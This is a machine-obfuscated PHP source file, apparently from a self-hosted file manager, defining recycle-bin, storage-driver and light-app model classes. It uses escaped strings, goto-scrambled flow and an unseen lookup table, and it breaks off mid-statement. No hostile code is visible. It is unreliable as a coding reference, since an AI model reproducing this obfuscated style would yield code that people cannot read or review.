dÙ“Š‰æ²¸: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\x65\137\162\145\x63\x79\143\154\145"; protected $dataAuto = array(array("\x63\162\x65\x61\164\x65\x54\x69\x6d\x65", "\164\151\x6d\x65", "\151\156\163\x65\162\164", "\x66\165\x6e\x63\164\151\x6f\x6e")); public function listData($e£Š„æäù¶ = false) { $A½İŞ°Ãƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e£Š„æäù¶ = $e£Š„æäù¶ ? $e£Š„æäù¶ : USER_ID; $Dæ·â ¼„· = $this->where(array($A½İŞ°Ãƒ[1509] => $e£Š„æäù¶))->select(); return array_to_keyvalue($Dæ·â ¼„·, $A½İŞ°Ãƒ[33], $A½İŞ°Ãƒ[395]); } public function moveToRecycle($F¦‡×­½Ãˆ) { goto E®ƒ´¾Ì°Ê; fÛº–ˆ†å: $this->recycleMove($F¦‡×­½Ãˆ, 1); if ($E‡‰Á¯¨èÒ[$C§Á“ÁÉİš[403]] == $C§Á“ÁÉİš[87]) { $Bñ¯—“Èï… = array($C§Á“ÁÉİš[553] => array($C§Á“ÁÉİš[512], $E‡‰Á¯¨èÒ[$C§Á“ÁÉİš[487]] . $F¦‡×­½Ãˆ . $C§Á“ÁÉİš[513])); $eÜŒõ¦İê->where($Bñ¯—“Èï…)->setField($C§Á“ÁÉİš[423], 1); } goto bëÈ“òëë; AÌ©ôÑ¬øß: if (!$E‡‰Á¯¨èÒ || $E‡‰Á¯¨èÒ[$C§Á“ÁÉİš[423]] == $C§Á“ÁÉİš[87]) { return; } $C¦©ÛÏ„Ûƒ = array($C§Á“ÁÉİš[410] => $F¦‡×­½Ãˆ, $C§Á“ÁÉİš[1509] => USER_ID, $C§Á“ÁÉİš[549] => $E‡‰Á¯¨èÒ[$C§Á“ÁÉİš[404]], $C§Á“ÁÉİš[550] => $E‡‰Á¯¨èÒ[$C§Á“ÁÉİš[484]], $C§Á“ÁÉİš[553] => $E‡‰Á¯¨èÒ[$C§Á“ÁÉİš[487]]); $this->add($C¦©ÛÏ„Ûƒ); goto fÛº–ˆ†å; E®ƒ´¾Ì°Ê: $C§Á“ÁÉİš =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÜŒõ¦İê = Model($C§Á“ÁÉİš[1197]); $E‡‰Á¯¨èÒ = $eÜŒõ¦İê->sourceInfo($F¦‡×­½Ãˆ); goto AÌ©ôÑ¬øß; bëÈ“òëë: } public function clear() { $this->remove(!1); } public function remove($AÒà›®©Ø³ = false, $cõêÒ½¬‰Æ = false) { goto fèâÒÆÌºÊ; BÍ¸Ú¨Ê¦: foreach ($EÛŒœã£é° as $f‰À÷‡˜) { if ($AÒà›®©Ø³ != !1 && !in_array($f‰À÷‡˜, $AÒà›®©Ø³)) { continue; } $BÇÀ¶ÆèÖ¨ = $C·çÄšÂÛ->sourceInfo($f‰À÷‡˜); $C·çÄšÂÛ->remove($f‰À÷‡˜, !1); $eÙ‰ªùÔ¯Ã = $BÇÀ¶ÆèÖ¨[$B¿‰äèè¾ä[404]] . $B¿‰äèè¾ä[71] . $BÇÀ¶ÆèÖ¨[$B¿‰äèè¾ä[484]]; $eŠ†ÒÈ‘˜…[$eÙ‰ªùÔ¯Ã] = array($B¿‰äèè¾ä[549] => $BÇÀ¶ÆèÖ¨[$B¿‰äèè¾ä[404]], $B¿‰äèè¾ä[484] => $BÇÀ¶ÆèÖ¨[$B¿‰äèè¾ä[484]]); $this->where(array($B¿‰äèè¾ä[395] => $f‰À÷‡˜))->delete(); } foreach ($eŠ†ÒÈ‘˜… as $fÌĞÂôã²À) { $C·çÄšÂÛ->targetSpaceUpdate($fÌĞÂôã²À[$B¿‰äèè¾ä[404]], $fÌĞÂôã²À[$B¿‰äèè¾ä[484]]); } goto bˆåëÎ÷ ß; AƒöÇâ³¹¶: $EÛŒœã£é° = $this->listData($cõêÒ½¬‰Æ); $AÒà›®©Ø³ = $AÒà›®©Ø³ === !1 ? !1 : $AÒà›®©Ø³; $eŠ†ÒÈ‘˜… = array(); goto BÍ¸Ú¨Ê¦; fèâÒÆÌºÊ: $B¿‰äèè¾ä =& $_SERVER[ÒÆ›ÆØÎ¾]; $cõêÒ½¬‰Æ = $cõêÒ½¬‰Æ ? $cõêÒ½¬‰Æ : USER_ID; $C·çÄšÂÛ = Model($B¿‰äèè¾ä[1197]); goto AƒöÇâ³¹¶; bˆåëÎ÷ ß: } public function restore($aÂØò¼¨åÃ = false) { $E…ïŸ…£› = $this->listData(); $this->_restoreSource($E…ïŸ…£›, $aÂØò¼¨åÃ); } public function removeUserAll($cÀë¬îº‰) { $this->remove(!1, $cÀë¬îº‰); } private function _restoreSource($Dˆ‚÷ÏØÀ, $cô–ˆšğ¸º) { goto d­¯Ü–‹åÍ; a ¤×‘·µ–: $D°ãÎØï->updateModifyTime($Cğ‚¤Œ˜î); goto d°ŒÑµÕ; d¡³Ë¬¢È¾: if (!$Dˆ‚÷ÏØÀ) { return !0; } $Cğ‚¤Œ˜î = array(); foreach ($Dˆ‚÷ÏØÀ as $c§ìÙŒ…ƒ½) { goto c¬’è¯ìÁ; Eë«Ò¡Ê‘à: if ($AğÉŒÇ‚Ÿ[$D¾¨÷ŠÙÈ[403]] == $D¾¨÷ŠÙÈ[87]) { $DæÇÙ’èò = array($D¾¨÷ŠÙÈ[553] => array($D¾¨÷ŠÙÈ[512], $AğÉŒÇ‚Ÿ[$D¾¨÷ŠÙÈ[487]] . $c§ìÙŒ…ƒ½ . $D¾¨÷ŠÙÈ[513])); $D°ãÎØï->where($DæÇÙ’èò)->setField($D¾¨÷ŠÙÈ[423], 0); $this->restoreFolderChildren($c§ìÙŒ…ƒ½, $Dˆ‚÷ÏØÀ); } $this->where(array($D¾¨÷ŠÙÈ[395] => $c§ìÙŒ…ƒ½))->delete(); $D°ãÎØï->folderSizeReset($AğÉŒÇ‚Ÿ[$D¾¨÷ŠÙÈ[478]]); goto e¡á„Ã«İ; B†Şç©ˆÉ¥: if ($B»áˆïäì[$D¾¨÷ŠÙÈ[423]] == $D¾¨÷ŠÙÈ[87]) { continue; } $D°ãÎØï->lockMoveStart($c§ìÙŒ…ƒ½); $this->recycleMove($c§ìÙŒ…ƒ½, 0); goto Eë«Ò¡Ê‘à; c¬’è¯ìÁ: if ($cô–ˆšğ¸º != !1 && !in_array($c§ìÙŒ…ƒ½, $cô–ˆšğ¸º)) { continue; } $AğÉŒÇ‚Ÿ = $D°ãÎØï->sourceInfo($c§ìÙŒ…ƒ½); $B»áˆïäì = $D°ãÎØï->sourceInfo($AğÉŒÇ‚Ÿ[$D¾¨÷ŠÙÈ[478]]); goto B†Şç©ˆÉ¥; e¡á„Ã«İ: $Cğ‚¤Œ˜î[] = $AğÉŒÇ‚Ÿ[$D¾¨÷ŠÙÈ[478]]; if ($AğÉŒÇ‚Ÿ[$D¾¨÷ŠÙÈ[403]] == $D¾¨÷ŠÙÈ[87]) { $Cğ‚¤Œ˜î[] = $c§ìÙŒ…ƒ½; } $D°ãÎØï->lockMoveEnd($c§ìÙŒ…ƒ½); goto FÁ™›‚‹¤½; FÁ™›‚‹¤½: } goto a ¤×‘·µ–; d­¯Ü–‹åÍ: $D¾¨÷ŠÙÈ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D°ãÎØï = Model($D¾¨÷ŠÙÈ[1197]); $cô–ˆšğ¸º = $cô–ˆšğ¸º == !1 ? !1 : $cô–ˆšğ¸º; goto d¡³Ë¬¢È¾; d°ŒÑµÕ: } private function restoreFolderChildren($A›ÌÔ‘…ğî, $C…¹Â˜†™) { goto bßæò¸Â; bßæò¸Â: $bÑ¼Àˆµ÷ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b†‹®ß¨³Î = Model($bÑ¼Àˆµ÷[1197]); $d™½‘‘İŸ„ = array($bÑ¼Àˆµ÷[395] => array($bÑ¼Àˆµ÷[7], array())); goto c±ŒœùÊ‹‘; BäÅ¾§×Ñª: $d™½‘‘İŸ„[$bÑ¼Àˆµ÷[395]][1] = array_unique($d™½‘‘İŸ„[$bÑ¼Àˆµ÷[395]][1]); $d™½‘‘İŸ„[$bÑ¼Àˆµ÷[948]] = $bÑ¼Àˆµ÷[1768]; $b†‹®ß¨³Î->where($d™½‘‘İŸ„)->setField($bÑ¼Àˆµ÷[423], 1); goto FÆ”İ‹«æ; c±ŒœùÊ‹‘: foreach ($C…¹Â˜†™ as $E»ÆøŒÎ¯³) { if ($E»ÆøŒÎ¯³ == $A›ÌÔ‘…ğî) { continue; } if (!$b†‹®ß¨³Î->isParentOf($A›ÌÔ‘…ğî, $E»ÆøŒÎ¯³)) { continue; } $B™©ø“¾· = $b†‹®ß¨³Î->sourceInfo($E»ÆøŒÎ¯³); if ($B™©ø“¾·[$bÑ¼Àˆµ÷[403]] == $bÑ¼Àˆµ÷[87]) { $d™½‘‘İŸ„[] = array($bÑ¼Àˆµ÷[553] => array($bÑ¼Àˆµ÷[512], $B™©ø“¾·[$bÑ¼Àˆµ÷[487]] . $E»ÆøŒÎ¯³ . $bÑ¼Àˆµ÷[513])); } else { $d™½‘‘İŸ„[$bÑ¼Àˆµ÷[395]][1][] = $E»ÆøŒÎ¯³; } } if (!$d™½‘‘İŸ„[$bÑ¼Àˆµ÷[395]][1]) { unset($d™½‘‘İŸ„[$bÑ¼Àˆµ÷[395]]); } if (!$d™½‘‘İŸ„) { return; } goto BäÅ¾§×Ñª; FÆ”İ‹«æ: } private function recycleMove($Bâá–°„†¼, $dÁ‘ˆçØ = 1) { $FŸïÀ‘ê‰ =& $_SERVER[ÒÆ›ÆØÎ¾]; $c·ƒ’í—²ã = Model($FŸïÀ‘ê‰[1197]); $E¼¶®¸¢¥¶ = Model($FŸïÀ‘ê‰[1977]); $c¨ùÃ’˜š‰ = array($FŸïÀ‘ê‰[395] => $Bâá–°„†¼); if ($dÁ‘ˆçØ) { $c·ƒ’í—²ã->where($c¨ùÃ’˜š‰)->setField($FŸïÀ‘ê‰[423], 1); $E¼¶®¸¢¥¶->eventRecycle($Bâá–°„†¼, $FŸïÀ‘ê‰[1978]); } else { $E½³ òù¡’ = $c·ƒ’í—²ã->where($c¨ùÃ’˜š‰)->find(); $Aë•›Œ£êÆ = $E½³ òù¡’[$FŸïÀ‘ê‰[403]] == $FŸïÀ‘ê‰[87]; $C¹ÙˆÓ´Ü = $c·ƒ’í—²ã->fileNameAuto($E½³ òù¡’[$FŸïÀ‘ê‰[478]], $E½³ òù¡’[$FŸïÀ‘ê‰[28]], REPEAT_RENAME_FOLDER, $Aë•›Œ£êÆ); if ($C¹ÙˆÓ´Ü != $E½³ òù¡’[$FŸïÀ‘ê‰[28]]) { $c·ƒ’í—²ã->rename($Bâá–°„†¼, $C¹ÙˆÓ´Ü); } $c·ƒ’í—²ã->where($c¨ùÃ’˜š‰)->setField($FŸïÀ‘ê‰[423], 0); $E¼¶®¸¢¥¶->eventRecycle($Bâá–°„†¼, $FŸïÀ‘ê‰[1979]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\163\x74\157\x72\141\x67\x65\114\x69\x73\x74"; public $field = array("\156\141\x6d\145", "\163\x69\x7a\x65\x4d\x61\170", "\x73\171\163\x74\x65\x6d", "\144\x65\146\x61\x75\x6c\x74", "\x64\x72\151\166\x65\x72", "\x63\x6f\156\146\x69\147"); public function listData($DÛ™¥‡¹ ¸ = false, $Aƒ†Îñó÷ğ = "\x6d\157\144\151\x66\x79\x54\151\x6d\x65", $dÊóÆ¾·Ï¥ = false) { $fÔÂİõ‰Ğ“ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EŒ‹„ºÏÛÁ = parent::listData($DÛ™¥‡¹ ¸, $Aƒ†Îñó÷ğ, $dÊóÆ¾·Ï¥); if ($DÛ™¥‡¹ ¸) { return $EŒ‹„ºÏÛÁ; } $eÎù§ ƒØš = $this->ioSizeUseGet(array_to_keyvalue($EŒ‹„ºÏÛÁ, $fÔÂİõ‰Ğ“[33], $fÔÂİõ‰Ğ“[393])); foreach ($EŒ‹„ºÏÛÁ as $F”™£ì±é¬ => $F¹ëÕ–¦÷) { unset($EŒ‹„ºÏÛÁ[$F”™£ì±é¬][$fÔÂİõ‰Ğ“[6]]); $EŒ‹„ºÏÛÁ[$F”™£ì±é¬][$fÔÂİõ‰Ğ“[1667]] = isset($eÎù§ ƒØš[$F¹ëÕ–¦÷[$fÔÂİõ‰Ğ“[393]]]) ? $eÎù§ ƒØš[$F¹ëÕ–¦÷[$fÔÂİõ‰Ğ“[393]]] : 0; } return $EŒ‹„ºÏÛÁ; } public function ioSizeUseGet($e˜ŒîùÅ´†) { goto e¦©Â‚Š¡‘; e¦©Â‚Š¡‘: $cÇ›¾šÃô =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$e˜ŒîùÅ´†) { return array(); } $EéÌæŒã  = $cÇ›¾šÃô[1980] . implode($cÇ›¾šÃô[47], $e˜ŒîùÅ´†); goto c¦†Ê‹òÎš; b‡ˆ“Ë»­ğ: $f¹—É­á¨ = array($cÇ›¾šÃô[774] => array($cÇ›¾šÃô[7], $e˜ŒîùÅ´†)); $FÉ¨­’ö¼‰ = Model($cÇ›¾šÃô[739])->field($E´ª”Ñ‚ßÈ)->where($f¹—É­á¨)->group($cÇ›¾šÃô[774])->select(); $FÉ¨­’ö¼‰ = array_to_keyvalue($FÉ¨­’ö¼‰, $cÇ›¾šÃô[393], $cÇ›¾šÃô[78]); goto FÖ¾ãëœæ¸; FÖ¾ãëœæ¸: Cache::set($EéÌæŒã , $FÉ¨­’ö¼‰, 600); return $FÉ¨­’ö¼‰; goto eÀƒ«¡ª„; c¦†Ê‹òÎš: $FÉ¨­’ö¼‰ = Cache::get($EéÌæŒã ); if ($FÉ¨­’ö¼‰) { return $FÉ¨­’ö¼‰; } $E´ª”Ñ‚ßÈ = array($cÇ›¾šÃô[774] => $cÇ›¾šÃô[393], $cÇ›¾šÃô[1981] => $cÇ›¾šÃô[78]); goto b‡ˆ“Ë»­ğ; eÀƒ«¡ª„: } public function getConfig($bÁµ–‹àì·) { $C‘ÎÜÓòô‹ = parent::listData($bÁµ–‹àì·); return json_decode($C‘ÎÜÓòô‹[$_SERVER[ÒÆ›ÆØÎ¾][6]], !0); } public function update($eÄø²Ê¥§ç, $C“Í©·¥ó) { goto A­îì¦öùê; cƒ¶‚«šà™: $f¤Ö´È§åÓ = parent::update($eÄø²Ê¥§ç, $C“Í©·¥ó); if ($f¤Ö´È§åÓ && $C“Í©·¥ó[$F„ˆ´……¦[34]]) { foreach ($E—Á®Ö®‹î as $D•Ïó¾˜ñ¹) { if ($D•Ïó¾˜ñ¹[$F„ˆ´……¦[34]] && $D•Ïó¾˜ñ¹[$F„ˆ´……¦[393]] != $eÄø²Ê¥§ç) { parent::update($D•Ïó¾˜ñ¹[$F„ˆ´……¦[393]], array($F„ˆ´……¦[34] => 0)); } } } return $f¤Ö´È§åÓ; goto D¸Ûª‡; A­îì¦öùê: $F„ˆ´……¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fÀ­„×À¶Ö = $C“Í©·¥ó[$F„ˆ´……¦[28]]; $E—Á®Ö®‹î = array_to_keyvalue(parent::listData(), $F„ˆ´……¦[28]); goto A™ø÷â†¬; A™ø÷â†¬: if (isset($E—Á®Ö®‹î[$fÀ­„×À¶Ö]) && $E—Á®Ö®‹î[$fÀ­„×À¶Ö][$F„ˆ´……¦[393]] != $eÄø²Ê¥§ç) { return !1; } if (isset($C“Í©·¥ó[$F„ˆ´……¦[1982]]) && $C“Í©·¥ó[$F„ˆ´……¦[1982]] == $F„ˆ´……¦[87]) { $this->checkConfig($C“Í©·¥ó); } unset($C“Í©·¥ó[$F„ˆ´……¦[1982]]); goto cƒ¶‚«šà™; D¸Ûª‡: } public function add($BÌËñ¯ÔŸ–) { goto FëÙÖ­Ÿ”; fˆì­Õµˆé: return $e²ë†Ö±Û; goto FÎ½Æİ¨±; B÷Ôììİê½: $this->checkConfig($BÌËñ¯ÔŸ–); $e²ë†Ö±Û = parent::insert($BÌËñ¯ÔŸ–); if ($e²ë†Ö±Û && $BÌËñ¯ÔŸ–[$E¸èÚ…ˆ·[34]]) { foreach ($Fˆ”ÖëµŒ as $e¯â’ÕÈå) { if ($e¯â’ÕÈå[$E¸èÚ…ˆ·[34]]) { parent::update($e¯â’ÕÈå[$E¸èÚ…ˆ·[393]], array($E¸èÚ…ˆ·[34] => 0)); } } } goto fˆì­Õµˆé; FëÙÖ­Ÿ”: $E¸èÚ…ˆ· =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fˆ”ÖëµŒ = array_to_keyvalue(parent::listData(), $E¸èÚ…ˆ·[28]); if (isset($Fˆ”ÖëµŒ[$BÌËñ¯ÔŸ–[$E¸èÚ…ˆ·[28]]])) { return !1; } goto B÷Ôììİê½; FÎ½Æİ¨±: } public function checkConfig(&$d¡¼Øƒ©¾, $dÒäçÇ’»¯ = false) { goto Ağ„¾õ‡Ó‘; b­ÃªŠÆ“Ä: $få£ÆĞàÏ¥ = $FôÁºÕäô ->getPath($d‡Œƒ„‰é½ . $D·—¤Öè”÷[1128]); if (!$FôÁºÕäô ->mkfile($få£ÆĞàÏ¥)) { if ($dÒäçÇ’»¯) { return LNG($D·—¤Öè”÷[1987]); } show_json(LNG($D·—¤Öè”÷[1987]), !1); } $DŒùÚõ÷ Á[$D·—¤Öè”÷[1067]] = $d‡Œƒ„‰é½; goto bÔ–‡ôøÓ; Dƒ…À‡¼±: $FôÁºÕäô  = new $E¯ÏÛİËÎ÷($DŒùÚõ÷ Á); if (in_array($eñ¾…¿àºÅ, $FôÁºÕäô ->objectDriver)) { if (!$FôÁºÕäô ->isBucketCors() && !$FôÁºÕäô ->setBucketCors()) { $e‰ë‚ğºæù = LNG($D·—¤Öè”÷[1987]); $e‰ë‚ğºæù .= $D·—¤Öè”÷[1988] . LNG($D·—¤Öè”÷[1989]); if ($dÒäçÇ’»¯) { return $e‰ë‚ğºæù; } show_json($e‰ë‚ğºæù, !1); } } $d‡Œƒ„‰é½ = rtrim($DŒùÚõ÷ Á[$D·—¤Öè”÷[1067]], $D·—¤Öè”÷[8]) . $D·—¤Öè”÷[8]; goto b­ÃªŠÆ“Ä; FèÓ·ÉĞ‡: $F„½œğ÷³ª = isset($EÒ¤‘‚šÏù[$eñ¾…¿àºÅ]) ? $EÒ¤‘‚šÏù[$eñ¾…¿àºÅ] : ucfirst($eñ¾…¿àºÅ); $E¯ÏÛİËÎ÷ = $D·—¤Öè”÷[72] . $F„½œğ÷³ª; if (!$F„½œğ÷³ª || !class_exists($E¯ÏÛİËÎ÷)) { if ($dÒäçÇ’»¯) { return LNG($D·—¤Öè”÷[1984]); } write_log(array($D·—¤Öè”÷[1985], $d¡¼Øƒ©¾, get_caller_info()), $D·—¤Öè”÷[1986]); show_json(LNG($D·—¤Öè”÷[1984]), !1, $d¡¼Øƒ©¾); } goto Dƒ…À‡¼±; E»™ŠÙÏ“: foreach ($DŒùÚõ÷ Á as $DŠ„ƒƒ¶ç¦ => $aÚË†ß‹³ï) { $DŒùÚõ÷ Á[$DŠ„ƒƒ¶ç¦] = trim($aÚË†ß‹³ï); } $DŒùÚõ÷ Á[$D·—¤Öè”÷[1983]] = rand_string(6); $EÒ¤‘‚šÏù = $GLOBALS[$D·—¤Öè”÷[6]][$D·—¤Öè”÷[88]][$D·—¤Öè”÷[783]]; goto FèÓ·ÉĞ‡; Ağ„¾õ‡Ó‘: $D·—¤Öè”÷ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eñ¾…¿àºÅ = strtolower($d¡¼Øƒ©¾[$D·—¤Öè”÷[94]]); $DŒùÚõ÷ Á = json_decode($d¡¼Øƒ©¾[$D·—¤Öè”÷[6]], !0); goto E»™ŠÙÏ“; bÔ–‡ôøÓ: $d¡¼Øƒ©¾[$D·—¤Öè”÷[6]] = json_encode($DŒùÚõ÷ Á); $d¡¼Øƒ©¾[$D·—¤Öè”÷[94]] = $F„½œğ÷³ª; return !0; goto Dˆ‘©†‰•‚; Dˆ‘©†‰•‚: } public function driverListSystem() { $eôíÆÊ¿ • =& $_SERVER[ÒÆ›ÆØÎ¾]; $eíë…¬Ù = parent::listData(); $Aã‰“ÛÌ¸Ò = array(); foreach ($eíë…¬Ù as $B‡ÀâÄ˜‡Î) { unset($B‡ÀâÄ˜‡Î[$eôíÆÊ¿ •[194]], $B‡ÀâÄ˜‡Î[$eôíÆÊ¿ •[84]]); $B‡ÀâÄ˜‡Î[$eôíÆÊ¿ •[6]] = json_decode($B‡ÀâÄ˜‡Î[$eôíÆÊ¿ •[6]], !0); $Aã‰“ÛÌ¸Ò[] = $B‡ÀâÄ˜‡Î; } return $Aã‰“ÛÌ¸Ò; } public function defaultDriver() { $A£ï‘ï ‹š =& $_SERVER[ÒÆ›ÆØÎ¾]; $f¹ä™µªã„ = parent::listData(); $DîÜÑŒ˜â = array_filter_by_field($f¹ä™µªã„, $A£ï‘ï ‹š[34], 1); $DîÜÑŒ˜â = $DîÜÑŒ˜â[0]; if ($DîÜÑŒ˜â) { $DîÜÑŒ˜â[$A£ï‘ï ‹š[6]] = json_decode($DîÜÑŒ˜â[$A£ï‘ï ‹š[6]], !0); } return $DîÜÑŒ˜â; } public function driverInfo($CùÀ·ÈŸˆ) { $FùŞ»ÀµŠÊ =& $_SERVER[ÒÆ›ÆØÎ¾]; $bø“·ïÃ• = array_to_keyvalue(parent::listData(), $FùŞ»ÀµŠÊ[393]); if (!isset($bø“·ïÃ•[$CùÀ·ÈŸˆ])) { return !1; } $f‹¯ïíĞª¢ = $bø“·ïÃ•[$CùÀ·ÈŸˆ]; $f‹¯ïíĞª¢[$FùŞ»ÀµŠÊ[6]] = json_decode($f‹¯ïíĞª¢[$FùŞ»ÀµŠÊ[6]], !0); return $f‹¯ïíĞª¢; } public function remove($a¾Äõ›šˆ) { $this->removeShareItems($a¾Äõ›šˆ); return parent::remove($a¾Äõ›šˆ); } public function removeWithFile($cÈî×ŠÃâÈ, $F™õÜŒĞ™õ) { goto eÅìÊ›­·Á; a¥ê‰Íİëñ: if (!$dË¾–¯Ø–Ç) { $FÆ»õÛ–›»->stop($c¥¨ø¨¦‚î); return !1; } $FÆ»õÛ–›»->end(); if ($F™õÜŒĞ™õ == $c—°ˆó—œ[1647]) { $this->remove($cÈî×ŠÃâÈ); } goto Eßƒ°×óÎß; eÅìÊ›­·Á: $c—°ˆó—œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b±Ú¸–§ßÍ = array($c—°ˆó—œ[774] => $cÈî×ŠÃâÈ); $AĞåÒ´µˆõ = Model($c—°ˆó—œ[450])->where($b±Ú¸–§ßÍ)->count(); goto FÍ‡Œìùğ¤; FÍ‡Œìùğ¤: $dµˆá“¶œ = Model($c—°ˆó—œ[450])->where($b±Ú¸–§ßÍ)->sum($c—°ˆó—œ[78]); $c¥¨ø¨¦‚î = $F™õÜŒĞ™õ . $c—°ˆó—œ[1990] . $cÈî×ŠÃâÈ; $FÆ»õÛ–›» = new TaskFileTransfer($c¥¨ø¨¦‚î, $c—°ˆó—œ[1986], $AĞåÒ´µˆõ, LNG($c—°ˆó—œ[1991]) . "\x28{$cÈî×ŠÃâÈ}\x29"); goto fº…¤³ÀŞ‡; Fáöé¡: $bİ’¬ôïÎ½ = Model($c—°ˆó—œ[193])->where($b±Ú¸–§ßÍ)->field($c—°ˆó—œ[1992])->select(); foreach ($bİ’¬ôïÎ½ as $d…Éåá…™ò) { goto EÂÆ’çÀÚÄ; C¬¬êÃ™”‹: $B¤ç„”¶÷ = array($c—°ˆó—œ[774] => $bôÙê—¢¼ë, $c—°ˆó—œ[76] => $e·±ÃäÏ); Model($c—°ˆó—œ[193])->where($b±Ú¸–§ßÍ)->save($B¤ç„”¶÷); goto AæÌİ”ÀŒ; EÂÆ’çÀÚÄ: $F ¸æİ‚ÓÕ = $d…Éåá…™ò[$c—°ˆó—œ[76]]; $e·±ÃäÏ = $Eô¾¿øœ¯ê . str_replace("\173\151\157\x3a{$cÈî×ŠÃâÈ}\x7d\x2f", $c—°ˆó—œ[33], $F ¸æİ‚ÓÕ); if (!IO::exist($F ¸æİ‚ÓÕ)) { $dµÈ‰“ĞÑ«[] = $d…Éåá…™ò[$c—°ˆó—œ[447]]; $FÆ»õÛ–›»->updateFileEnd($d…Éåá…™ò[$c—°ˆó—œ[28]], $d…Éåá…™ò[$c—°ˆó—œ[78]]); continue; } goto Aƒ ‡å‚½™; Aƒ ‡å‚½™: if (IO::exist($e·±ÃäÏ)) { $FÆ»õÛ–›»->updateFileEnd($d…Éåá…™ò[$c—°ˆó—œ[28]], $d…Éåá…™ò[$c—°ˆó—œ[78]]); continue; } if (!IO::move($F ¸æİ‚ÓÕ, get_path_father($e·±ÃäÏ))) { $dË¾–¯Ø–Ç = !1; break; } $b±Ú¸–§ßÍ = array($c—°ˆó—œ[447] => $d…Éåá…™ò[$c—°ˆó—œ[447]]); goto C¬¬êÃ™”‹; AæÌİ”ÀŒ: } $this->removeByFileID($dµÈ‰“ĞÑ«); goto a¥ê‰Íİëñ; fº…¤³ÀŞ‡: $FÆ»õÛ–›»->task[$c—°ˆó—œ[715]] = (double) $dµˆá“¶œ; $cÏ»íŒ¬°‡ = KodIO::defaultDriver(); $bôÙê—¢¼ë = $cÏ»íŒ¬°‡[$c—°ˆó—œ[393]]; goto f´ƒ¥‚©ê; f´ƒ¥‚©ê: $Eô¾¿øœ¯ê = "\173\151\x6f\x3a{$bôÙê—¢¼ë}\175\57"; $dË¾–¯Ø–Ç = !0; $dµÈ‰“ĞÑ« = array(); goto Fáöé¡; Eßƒ°×óÎß: } public function progress($bª·îáÜ‹, $EÒøóâ¸«ô) { return Task::get($EÒøóâ¸«ô . $_SERVER[ÒÆ›ÆØÎ¾][1990] . $bª·îáÜ‹); } private function removeByFileID($cØ£‘•‹‰â = array()) { goto c‘«¯ë¥‡º; BÊ§éöÜÏ: foreach ($B£œÄ‡“Ï« as $fÒ“Õ¦Ïƒè) { Model($D–âñ­©Ùê[409])->removeNow($fÒ“Õ¦Ïƒè, !1); } goto a¾Í¶¡ğÊ; c‘«¯ë¥‡º: $D–âñ­©Ùê =& $_SERVER[ÒÆ›ÆØÎ¾]; if (empty($cØ£‘•‹‰â)) { return; } $cé…ó£Ï¹Š = array($D–âñ­©Ùê[447] => array($D–âñ­©Ùê[7], $cØ£‘•‹‰â)); goto B¯¯µ–ï; B¯¯µ–ï: $B£œÄ‡“Ï« = Model($D–âñ­©Ùê[1197])->where($cé…ó£Ï¹Š)->field($D–âñ­©Ùê[395])->select(); if (!$B£œÄ‡“Ï«) { return; } $B£œÄ‡“Ï« = array_to_keyvalue($B£œÄ‡“Ï«, $D–âñ­©Ùê[33], $D–âñ­©Ùê[395]); goto BÊ§éöÜÏ; a¾Í¶¡ğÊ: } private function removeShareItems($dÄ©¬ØÅ) { goto D¼—‰‚ Èñ; f¥•¸ˆÊÙã: $e¿‹¨Ÿİõ† = Model($e‡¼ˆÁáñØ[1658])->where($DÉ¼ÊŸ®²Ñ)->field($e‡¼ˆÁáñØ[468])->select(); if (empty($e¿‹¨Ÿİõ†)) { return; } $DÎø¼Ó¢Ê‘ = array_to_keyvalue($e¿‹¨Ÿİõ†, $e‡¼ˆÁáñØ[33], $e‡¼ˆÁáñØ[468]); goto AÎË˜µ´ƒ; D¼—‰‚ Èñ: $e‡¼ˆÁáñØ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F°ñÙØï = "\x7b\151\x6f\x3a{$dÄ©¬ØÅ}\x7d\x2f"; $DÉ¼ÊŸ®²Ñ = array($e‡¼ˆÁáñØ[395] => 0, $e‡¼ˆÁáñØ[1062] => array($e‡¼ˆÁáñØ[380], "{$F°ñÙØï}\x25")); goto f¥•¸ˆÊÙã; AÎË˜µ´ƒ: Model($e‡¼ˆÁáñØ[563])->remove($DÎø¼Ó¢Ê‘); goto f‹’œ˜ŸŞ¡; f‹’œ˜ŸŞ¡: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\114\x69\147\x68\164\101\x70\x70"; public $modelType = "\123\171\x73\164\145\155\117\160\164\151\157\156"; public $field = array("\156\x61\155\145", "\x67\162\157\x75\x70", "\144\145\163\x63", "\x63\157\x6e\x74\145\156\164"); public function listData($BœùïÂå¶ = false, $FŒ‡Ø»é = "\x6d\157\x64\x69\146\x79\x54\151\x6d\145", $dô“Çœ¾Ş = true) { return parent::listData($BœùïÂå¶, $FŒ‡Ø»é, $dô“Çœ¾Ş); } public function remove($fÜ÷¡‘Ü¨) { $aŸÄ·±œóÖ = $this->findByName($fÜ÷¡‘Ü¨); if (!$aŸÄ·±œóÖ) { return !1; } return parent::remove($aŸÄ·±œóÖ[$_SERVER[ÒÆ›ÆØÎ¾][393]]); } public function add($B‘Å†ÚÚ”) { if ($this->findByName($B‘Å†ÚÚ”[$_SERVER[ÒÆ›ÆØÎ¾][28]])) { return !1; } return parent::insert($B‘Å†ÚÚ”); } public function update($Cœä¹Œ¿š, $B·ƒ•‹’Š¢) { $cµ­¢“®Ü© =& $_SERVER[ÒÆ›ÆØÎ¾]; $CĞİÅ¹–ïœ = $this->findByName($Cœä¹Œ¿š); $A×ËñÍê¨¹ = $this->findByName($B·ƒ•‹’Š¢[$cµ­¢“®Ü©[28]]); if (!$CĞİÅ¹–ïœ || $A×ËñÍê¨¹ && $A×ËñÍê¨¹[$cµ­¢“®Ü©[393]] != $CĞİÅ¹–ïœ[$cµ­¢“®Ü©[393]]) { return !1; } return parent::update($CĞİÅ¹–ïœ[$cµ­¢“®Ü©[393]], 